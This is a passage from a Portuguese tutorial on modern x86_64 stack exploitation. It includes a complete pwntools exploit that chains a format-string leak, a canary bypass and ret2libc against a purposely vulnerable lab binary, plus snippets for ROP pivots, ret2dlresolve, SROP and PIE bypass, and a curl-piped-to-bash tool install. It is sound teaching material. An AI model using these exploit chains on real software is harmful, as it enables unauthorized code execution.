    while (1) {
        menu();
        scanf("%d", &choice);
        getchar();  /* Consumir newline */

        switch (choice) {
            case 1: deixar_nota(); break;
            case 2: ver_nota(); break;
            case 3: exit(0);
            default: puts("Opção inválida.");
        }
    }
    return 0;
}
```

```bash
# Compilar com proteções realistas (exceto PIE)
$ gcc -o vuln_full vuln_full.c -no-pie -fstack-protector-all -g
# Resultado: NX ativo, Canary ativo, ASLR ativo, Partial RELRO, sem PIE
$ checksec --file=./vuln_full
[*] '/tmp/vuln_full'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

### Plano de ataque

1. **Format string** (opção 2) → vazar canário e endereço da libc
2. **Buffer overflow** (opção 1) → sobrescrever RIP com ROP chain, preservando canário
3. **ROP chain** → ret2libc com `system("/bin/sh")`

### Exploit completo

```python
#!/usr/bin/env python3
"""
Exploit: Full protection bypass (NX + ASLR + Canary)
Alvo: vuln_full
Cadeia: Format String leak → Canary bypass → ret2libc
Proteções: NX ✓, ASLR ✓, Canary ✓, Partial RELRO, No PIE
"""
from pwn import *

# ═══════════════════════════════════════════════════════════
# CONFIGURAÇÃO
# ═══════════════════════════════════════════════════════════
context.binary = elf = ELF('./vuln_full')
context.log_level = 'info'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Gadgets no binário (fixos, sem PIE)
POP_RDI = 0x401303  # ROPgadget --binary ./vuln_full | grep "pop rdi"
RET     = 0x40101a  # ret (alinhamento)

def choose(p, option):
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def exploit():
    p = process('./vuln_full')

    # ═══════════════════════════════════════════
    # FASE 1: Leak via format string
    # ═══════════════════════════════════════════
    log.info("═" * 50)
    log.info("FASE 1: Information leak via format string")
    log.info("═" * 50)

    # Primeiro, descobrir offsets do canário e de um endereço libc na stack
    # Deixar nota com format string de reconhecimento
    choose(p, 1)
    p.recvuntil(b"Sua nota: ")
    # Vazar múltiplas posições para encontrar canário e endereço libc
    p.send(b"%11$p.%13$p.%15$p.%17$p.%19$p.%21$p.%23$p.%25$p")

    # Ver nota (executa o format string)
    choose(p, 2)
    p.recvuntil(b"Nota: ")
    leaked = p.recvline().strip().decode()
    values = leaked.split(".")
    log.info(f"Valores vazados: {values}")

    # Identificar canário (termina em 00, alta entropia)
    # e endereço libc (começa com 0x7f)
    canary = None
    libc_leak = None

    for i, val in enumerate(values):
        if val == "(nil)":
            continue
        try:
            v = int(val, 16)
            # Canário: último byte é 0x00, não começa com 0x7f, não é endereço pequeno
            if (v & 0xFF == 0) and (v > 0xFFFFFFFF) and ((v >> 40) != 0x7f):
                if canary is None:
                    canary = v
                    log.success(f"Canário encontrado no offset {11 + i*2}: {hex(canary)}")
            # Endereço libc: começa com 0x7f
            elif (v >> 40) == 0x7f:
                if libc_leak is None:
                    libc_leak = v
                    log.success(f"Endereço libc no offset {11 + i*2}: {hex(libc_leak)}")
        except:
            continue

    if canary is None or libc_leak is None:
        log.error("Não conseguiu vazar canário ou libc. Ajustar offsets!")
        # Fallback: tentar offsets específicos
        choose(p, 1)
        p.recvuntil(b"Sua nota: ")
        p.send(b"%11$p|%15$p")  # Offsets comuns para canário e __libc_start_main
        choose(p, 2)
        p.recvuntil(b"Nota: ")
        parts = p.recvline().strip().decode().split("|")
        canary = int(parts[0], 16)
        libc_leak = int(parts[1], 16)

    # ═══════════════════════════════════════════
    # FASE 2: Calcular endereços
    # ═══════════════════════════════════════════
    log.info("═" * 50)
    log.info("FASE 2: Calculando endereços")
    log.info("═" * 50)

    # O leak da libc geralmente é __libc_start_main+128 ou similar
    # Precisamos identificar qual função é e calcular o offset
    # Método: subtrair offsets conhecidos e verificar alinhamento de página
    libc_start_main_offset = libc.symbols['__libc_start_main']
    # Heurística: o leak geralmente é __libc_start_main + algum offset
    # Calcular base assumindo offset típico (ajustar conforme necessário)
    libc.address = (libc_leak - libc_start_main_offset - 128) & ~0xFFF  # Alinhar em página

    system_addr = libc.symbols['system']
    bin_sh = next(libc.search(b'/bin/sh'))

    log.success(f"libc base:  {hex(libc.address)}")
    log.info(f"system():   {hex(system_addr)}")
    log.info(f"/bin/sh:    {hex(bin_sh)}")
    log.info(f"canário:    {hex(canary)}")

    # ═══════════════════════════════════════════
    # FASE 3: Buffer overflow com canário correto + ROP
    # ═══════════════════════════════════════════
    log.info("═" * 50)
    log.info("FASE 3: Overflow + ROP chain")
    log.info("═" * 50)

    # Layout de deixar_nota():
    # temp[64] + canário[8] + saved_rbp[8] + saved_rip[8]
    OFFSET_CANARY = 64  # Pode variar! Verificar com GDB

    payload = b"A" * OFFSET_CANARY
    payload += p64(canary)          # Canário correto (bypass!)
    payload += b"B" * 8             # saved RBP
    payload += p64(RET)             # Alinhamento de stack
    payload += p64(POP_RDI)         # pop rdi; ret
    payload += p64(bin_sh)          # RDI = "/bin/sh"
    payload += p64(system_addr)     # system("/bin/sh")

    choose(p, 1)
    p.recvuntil(b"Sua nota: ")
    p.send(payload)

    # Sair do menu para triggerar o ret de deixar_nota()
    # Na verdade, o overflow já aconteceu no read() de deixar_nota()
    # O ret acontece quando deixar_nota() retorna

    log.success("Payload enviado! Shell incoming...")
    p.interactive()

if __name__ == "__main__":
    exploit()
```

#### Execução esperada

Quando os offsets estão corretos, a execução fica assim:

```bash
$ python3 exploit_full.py
[*] Fase 1: Information leak via format string
[+] Canário vazado: 0xd0a8f2e3b5c71200
[+] Endereço libc: 0x7f89bba81060
[*] Fase 2: Calculando endereços
[+] libc base:  0x7f89bb9ff000
[*] system():   0x7f89bba53790
[*] /bin/sh:    0x7f89bbba9ea4
[*] Fase 3: Overflow + ROP chain
[+] Payload enviado! Shell incoming...
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

Três proteções bypassadas em sequência: format string vaza o canário e um endereço da libc, o overflow preserva o canário correto, e a ROP chain chama `system("/bin/sh")` com endereços calculados.

### Notas sobre o exploit

1. **Os offsets do format string precisam ser descobertos empiricamente.** Eles variam conforme compilador, otimizações e layout da stack.

2. **O offset do canário no buffer** pode não ser exatamente 64. O compilador pode adicionar padding. Verificar com GDB:
```bash
(gdb) disas deixar_nota
# Procurar: mov rax, QWORD PTR fs:0x28 → mov QWORD PTR [rbp-0x??], rax
# O offset do canário é rbp - 0x??
```

3. **A identificação do leak da libc** requer saber qual função/offset foi vazado. Técnica: vazar `__libc_start_main_ret` (endereço de retorno de `__libc_start_main` na stack) e subtrair o offset conhecido.

---

## Ferramentas Essenciais

### GDB com extensões

O GDB puro é funcional mas pouco amigável. Use uma extensão:

**pwndbg** (recomendado para exploração):
```bash
$ git clone https://github.com/pwndbg/pwndbg
$ cd pwndbg && ./setup.sh
```

**GEF** (alternativa leve):
```bash
$ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Comandos essenciais:
```bash
(gdb) checksec              # Verificar proteções
(gdb) vmmap                 # Mapa de memória
(gdb) canary                # Mostrar valor do canário
(gdb) telescope $rsp 20    # Visualizar stack
(gdb) rop --grep "pop rdi" # Buscar gadgets
(gdb) cyclic 200           # Gerar padrão para encontrar offset
(gdb) cyclic -l 0x61616168 # Calcular offset do padrão
(gdb) heap                  # Visualizar heap
(gdb) got                   # Mostrar GOT entries
(gdb) plt                   # Mostrar PLT entries
```

### pwntools

Framework Python para exploração de binários:

```bash
$ pip install pwntools
```

Funcionalidades principais:
```python
from pwn import *

# Conexão
p = process('./programa')           # Local
p = remote('ctf.exemplo.com', 1337) # Remoto

# I/O
p.send(b"dados")
p.sendline(b"dados\n")
p.recvuntil(b"prompt: ")
p.recvline()
p.interactive()

# Packing
p64(0xdeadbeef)          # Pack 64-bit little-endian
u64(b"\xef\xbe\xad\xde\x00\x00\x00\x00")  # Unpack

# ELF analysis
elf = ELF('./programa')
elf.symbols['main']      # Endereço de main
elf.plt['puts']          # puts@PLT
elf.got['puts']          # puts@GOT

# ROP
rop = ROP(elf)
rop.find_gadget(['pop rdi', 'ret'])
rop.call('puts', [elf.got['puts']])
rop.chain()

# Shellcraft
shellcode = asm(shellcraft.sh())  # Shellcode para shell
shellcode = asm(shellcraft.cat('/flag'))  # Ler arquivo

# Cyclic (encontrar offset)
cyclic(200)              # Gerar padrão
cyclic_find(0x61616168)  # Encontrar offset
```

### Outras ferramentas

| Ferramenta | Uso |
|------------|-----|
| `checksec` | Verificar proteções de binário |
| `ROPgadget` | Encontrar gadgets ROP |
| `ropper` | Alternativa ao ROPgadget, gera chains |
| `one_gadget` | Encontrar gadgets "mágicos" na libc |
| `Ghidra` | Decompilação e análise estática |
| `radare2/rizin` | Framework de reversing via CLI |
| `objdump` | Disassembly rápido |
| `readelf` | Informações sobre ELF |
| `ltrace/strace` | Trace de chamadas de biblioteca/sistema |
| `seccomp-tools` | Analisar filtros seccomp |
| `patchelf` | Modificar ELF (trocar libc, linker) |
| `pwninit` | Setup automático de ambiente (libc, linker) |

### Workflow típico de exploração

```
1. checksec ./programa          → Identificar proteções
2. file ./programa              → Arquitetura, linking
3. Ghidra/IDA                   → Entender lógica, encontrar vulns
4. GDB + pwndbg                 → Análise dinâmica, encontrar offsets
5. ROPgadget                    → Coletar gadgets
6. one_gadget libc.so.6         → Verificar atalhos
7. pwntools                     → Escrever exploit
8. Testar local → Testar remoto
```

---

## Técnicas Avançadas: Além do Básico

Aqui entram técnicas que vão além do escopo do artigo original, mas que são essenciais pra exploração moderna. Cada uma delas merecia um artigo próprio, mas vou dar uma visão geral pra vocês saberem que existem e onde procurar mais.

### Stack Pivot

Quando o overflow é limitado (poucos bytes após o RIP), podemos redirecionar o RSP para uma região maior que controlamos:

```
Situação: overflow de apenas 16 bytes após saved RIP (cabe 2 gadgets)
Solução: usar "leave; ret" para mover RSP para buffer controlado

leave = mov rsp, rbp; pop rbp
Se controlarmos RBP (saved RBP no overflow), podemos apontar RSP para qualquer lugar!
```

```python
# Stack pivot: RBP aponta para buffer controlado, leave;ret move RSP para lá
LEAVE_RET = 0x4011a8  # leave; ret gadget
BUFFER_ADDR = 0x404100  # Endereço de buffer controlado (ex: .bss, variável global)

# Primeiro: escrever ROP chain no buffer controlado (via outra primitiva)
# Depois: overflow com:
payload = b"A" * 64
payload += p64(BUFFER_ADDR)  # saved RBP → aponta para nosso buffer
payload += p64(LEAVE_RET)    # saved RIP → leave; ret (pivota stack)
```

### ret2dlresolve

Técnica avançada que abusa do dynamic linker para resolver símbolos arbitrários, sem precisar de leak da libc:

```python
from pwn import *

context.binary = elf = ELF('./vuln5')

# pwntools automatiza ret2dlresolve!
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop = ROP(elf)
rop.read(0, dlresolve.data_addr)  # Ler payload para .bss
rop.ret2dlresolve(dlresolve)       # Resolver e chamar system("/bin/sh")

payload = b"A" * 72 + rop.chain()

p = process('./vuln5')
p.recvuntil(b"Digite algo: ")
p.send(payload)
sleep(0.5)
p.send(dlresolve.payload)  # Enviar estruturas fake para .bss
p.interactive()
```

### SROP (Sigreturn-Oriented Programming)

Usa a syscall `sigreturn` para carregar **todos os registradores** de uma vez a partir de um frame na stack:

```python
from pwn import *

context.arch = 'amd64'

# sigreturn restaura TODOS os registradores de um "signal frame" na stack
frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr # "/bin/sh"
frame.rsi = 0           # NULL
frame.rdx = 0           # NULL
frame.rip = syscall_addr # syscall gadget

# Payload: trigger sigreturn, que carrega o frame e executa execve
payload = b"A" * offset
payload += p64(pop_rax)      # pop rax; ret
payload += p64(15)           # 15 = __NR_rt_sigreturn
payload += p64(syscall_addr) # syscall (executa sigreturn)
payload += bytes(frame)      # Signal frame com registradores desejados
```

### Partial Overwrite (bypass PIE)

Com PIE ativo, endereços do binário são randomizados. Mas os **últimos 12 bits** (3 nibbles) são sempre fixos (alinhamento de página de 4KB). Podemos sobrescrever apenas 1-2 bytes do endereço de retorno:

```python
# Endereço original de retorno: 0x5555555551a8 (retorno para main)
# Endereço de win():            0x555555555142
# Diferença: apenas nos últimos 2 bytes!

# Sobrescrever apenas os 2 bytes menos significativos:
payload = b"A" * offset
payload += b"\x42\x51"  # Sobrescreve apenas 2 bytes do RIP
# 0x5555555551a8 → 0x555555555142 (win!)
# Funciona 1/16 das vezes (4 bits de entropia no nibble que muda)
```

### One Gadget

Gadgets na libc que dão shell diretamente, sem precisar de ROP chain complexa:

```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Se as constraints forem satisfeitas no momento do jump, basta um único endereço para obter shell:

```python
one_gadget = libc.address + 0x4f2a5
payload = b"A" * offset + p64(one_gadget)
```

---

## Exercícios Práticos

Para consolidar o conhecimento, aqui estão exercícios progressivos:

### Nível 1: Fundamentos
1. Compile `vuln1.c` e encontre o offset exato até o RIP usando `cyclic` do pwntools
2. Redirecione a execução para uma função `win()` que você adicionar ao código
3. Repita com buffer de tamanhos diferentes (32, 128, 256 bytes)

### Nível 2: Shellcode
4. Escreva um shellcode x64 que execute `execve("/bin/sh", NULL, NULL)` sem null bytes
5. Explore `vuln3.c` com seu shellcode (stack executável, sem ASLR)
6. Modifique o shellcode para ler `/etc/passwd` em vez de dar shell (syscall read + write)

### Nível 3: ROP
7. Explore `vuln5.c` usando ret2libc (com ASLR desabilitado)
8. Encontre gadgets no binário e construa uma ROP chain manual para `execve`
9. Repita com ASLR ativo: faça leak via puts@PLT e calcule a base da libc

### Nível 4: Proteções
10. Explore `vuln7.c`: use format string para vazar o canário, depois faça overflow
11. Combine leak de canário + leak de libc + ROP em um único exploit
12. Explore um binário com PIE usando partial overwrite

### Nível 5: CTF
13. Resolva desafios de pwn em plataformas como:
    - [pwnable.kr](http://pwnable.kr)
    - [pwnable.tw](https://pwnable.tw)
    - [ROP Emporium](https://ropemporium.com) (progressão didática de ROP)
    - [Nightmare](https://guyinatuxedo.github.io/) (writeups organizados por técnica)
    - [picoCTF](https://picoctf.org) (CTF para iniciantes)

---

## Comparação Resumida: x86 vs x86_64

| Aspecto | x86 (artigo original) | x86_64 (este artigo) |
|---------|----------------------|----------------------|
| Tamanho de endereço | 4 bytes | 8 bytes |
| Registrador de instrução | EIP | RIP |
| Registrador de stack | ESP | RSP |
| Registrador de frame | EBP | RBP |
| Passagem de argumentos | Todos na stack | 6 primeiros em registradores |
| Endereço de retorno | [EBP + 4] | [RBP + 8] |
| Null bytes em endereços | Raro | Sempre (endereços canônicos) |
| Alinhamento de stack | 4 bytes | 16 bytes (obrigatório antes de call) |
| Shellcode syscall | `int 0x80` | `syscall` |
| Syscall args | EBX, ECX, EDX, ESI, EDI, EBP | RDI, RSI, RDX, R10, R8, R9 |
| Syscall number | EAX | RAX |
| NOP sled efetividade | Alta (endereços previsíveis) | Baixa (ASLR 47 bits) |
| ret2libc | Trivial (args na stack) | Requer gadget pop rdi |
| Brute force ASLR | Viável (2¹⁶ tentativas) | Inviável (2³⁰+ tentativas) |
| Proteções típicas | Nenhuma (1996) | NX + ASLR + Canary + PIE + RELRO |

---

## Conclusão

O "Smashing the Stack for Fun and Profit" do Aleph One estabeleceu as bases da exploração de binários em 1996. Trinta anos depois, os **conceitos fundamentais permanecem os mesmos**:

- A stack cresce para baixo
- Variáveis locais ficam abaixo do endereço de retorno
- Um overflow pode sobrescrever o endereço de retorno
- Controlar o fluxo de execução = comprometer o programa

O que mudou é a **complexidade da exploração**:

1. **Antes**: overflow → shellcode na stack → shell
2. **Agora**: overflow → leak canário → leak libc → calcular gadgets → ROP chain → shell

As proteções modernas (NX, ASLR, Canaries, PIE, RELRO) não eliminaram buffer overflows. Elas elevaram a barra. Cada proteção pode ser contornada individualmente, e a arte da exploração moderna está no **encadeamento** de técnicas para derrotar múltiplas proteções simultaneamente.

Eu acho isso bonito, sinceramente. A corrida armamentista entre defesa e ataque fez com que a área evoluísse de forma absurda. O que era um truque simples em 1996 virou uma disciplina inteira de engenharia reversa, matemática e criatividade. E o paper do Aleph One continua sendo o ponto de partida perfeito pra entender tudo isso.

### O que vem depois?

- **Heap exploitation**: use-after-free, double free, tcache poisoning. Uma classe inteira de vulnerabilidades com técnicas próprias
- **Kernel exploitation**: mesmos conceitos, mas no ring 0 com proteções adicionais (SMEP, SMAP, KASLR, KPTI)
- **Browser exploitation**: JIT spraying, type confusion em engines JavaScript, sandbox escape
- **Fuzzing**: descoberta automatizada de crashes com AFL++, libFuzzer, honggfuzz
- **Symbolic execution**: análise automatizada de paths com angr, KLEE

### Referências

- Aleph One, "Smashing the Stack for Fun and Profit", Phrack 49, 1996
- Solar Designer, "Getting around non-executable stack (and fix)", 1997 (primeiro ret2libc)
- Hovav Shacham, "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)", CCS 2007 (paper original de ROP)
- Erik Bosman, "Framing Signals: A Return to Portable Shellcode", IEEE S&P 2014 (SROP)
- System V AMD64 ABI specification
- Intel® 64 and IA-32 Architectures Software Developer's Manual

---

*Artigo escrito em maio de 2026. Testado em Kali Linux 6.19.11 x86_64 com GCC 15.2, GDB 17.1 + pwndbg, e pwntools 4.15.0.*

*Se esse artigo te ajudou de alguma forma, compartilha com a comunidade. O Brasil precisa de mais conteúdo técnico de qualidade em português sobre segurança ofensiva.*
